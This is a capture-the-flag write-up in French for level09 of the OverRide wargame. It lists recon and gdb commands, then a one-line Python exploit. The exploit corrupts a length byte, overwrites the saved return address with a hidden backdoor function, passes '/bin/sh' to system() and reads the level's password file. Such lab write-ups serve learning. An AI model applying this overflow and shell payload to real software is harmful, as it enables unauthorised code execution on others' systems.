# Level09 -- commands

## Interpreter (VM)

```bash
which python python2 python3 2>/dev/null
```

Utiliser **`python` ou `python2`** si `python3` est absent.

---

## Step 1 -- Recon

```bash
file ./level09
checksec ./level09
nm ./level09
```

Purpose: identifier les protections (NX, PIE, RELRO) et lister les symboles. **`nm`** revele une fonction **`secret_backdoor`** (offset `0x88c`) qui fait `fgets` + `system()`.

---

## Step 2 -- Desassembler secret_backdoor

```bash
objdump -d ./level09 | grep -A 20 '<secret_backdoor>'
```

Purpose: confirmer que `secret_backdoor` lit une ligne avec `fgets(buf, 128, stdin)` puis appelle `system(buf)`.

---

## Step 3 -- Trouver la base PIE sur la VM

```bash
gdb -q ./level09
```

```text
break main
run
info proc mappings
```

Purpose: sur la VM OverRide (ASLR desactive), la base PIE est typiquement **`0x555555554000`**. L'adresse runtime de `secret_backdoor` = base + `0x88c` = **`0x55555555488c`**.

---

## Step 4 -- Exploit final (one-liner)

```bash
( python -c 'import struct,sys;sys.stdout.write("A"*40+"\xff"+"\n"+"A"*200+struct.pack("<Q",0x55555555488c)+"\n"+"/bin/sh\n")' ; cat ) | ./level09
```

Purpose:
- **Ligne 1** (username) : 40 x `A` + `\xff` -> corrompt le LSB de `msg_len` a **255**.
- **Ligne 2** (message) : 200 x `A` (padding jusqu'au saved RIP) + adresse LE de `secret_backdoor` (**`0x55555555488c`**).
- **Ligne 3** : `/bin/sh` lu par `fgets` dans `secret_backdoor`, passe a `system()`.
- **`; cat`** : garde stdin ouvert pour le shell.

---

## Step 5 -- Recuperer le flag

```bash
cat /home/users/end/.pass
```

Purpose: une fois le shell obtenu en tant que `end`, lire le flag.

---

## Documentation

- Raisonnement : **`walkthrough`**
- Desassemblage : **`Ressources/disassembly.md`**
- Source reconstruite : **`source`**
